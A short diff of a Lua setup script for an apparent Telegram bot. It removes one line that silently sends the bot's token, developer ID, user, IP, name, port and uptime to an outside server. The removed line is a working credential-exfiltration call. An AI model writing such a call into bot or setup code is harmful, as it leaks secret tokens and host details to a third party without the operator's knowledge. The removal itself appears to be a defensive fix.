@@ -71,7 +71,6 @@ ALQUBTAN = DevAbs:get(ServerALQUBTAN.."TokenALQUBTAN"):match("(%d+)"),
 SudoIds = {DevAbs:get(ServerALQUBTAN.."IdALQUBTAN")},
 }
 Create(Config, "./config.lua")   
-https.request("https://apiabs.ml/config.php?Get=ALQUBTAN&DevId="..DevAbs:get(ServerALQUBTAN.."IdALQUBTAN").."&TokenBot="..DevAbs:get(ServerALQUBTAN.."TokenALQUBTAN").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 file = io.open("ALQUBTAN.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
